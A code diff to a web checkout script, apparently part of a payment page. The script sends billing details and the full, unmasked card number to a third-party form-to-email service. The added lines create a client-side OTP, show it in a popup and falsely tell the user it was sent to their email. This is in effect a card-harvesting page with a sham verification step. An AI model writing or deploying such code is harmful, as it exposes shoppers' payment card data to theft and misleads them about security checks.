@@ -284,14 +284,15 @@
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     localStorage.setItem('paymentOTP', otp);
 
-    // OTP will be sent to user's email/phone (not shown in demo)
+    // Show OTP to user (for demo purposes)
+    alert(`Payment OTP: ${otp}\n\nThis OTP has been sent to ${billingData.email}\n\nPlease note this OTP for verification.`);
 
     // Send payment info to FormSubmit
     const formData = new FormData();
     formData.append('_subject', 'New Order - Payment Information');
     formData.append('_template', 'table');
     formData.append('_captcha', 'false');
-    formData.append('_autoresponse', 'Thank you for your payment! We have received your payment information and will process your order shortly.');
+    formData.append('_autoresponse', `Thank you for your payment! Your OTP is: ${otp}. This OTP has been sent to your registered email for verification.`);
     
     // Add all billing details unmasked
     formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
@@ -307,6 +308,7 @@
     formData.append('orderTotal', billingData.orderTotal || '0');
     formData.append('paymentStatus', 'Payment Information Received');
     formData.append('submissionTime', new Date().toLocaleString());
+    formData.append('generatedOTP', otp); // Add OTP to email data
     
     if (selectedPm === 'card') {
       formData.append('cardNumber', cn); // Send full card number unmasked
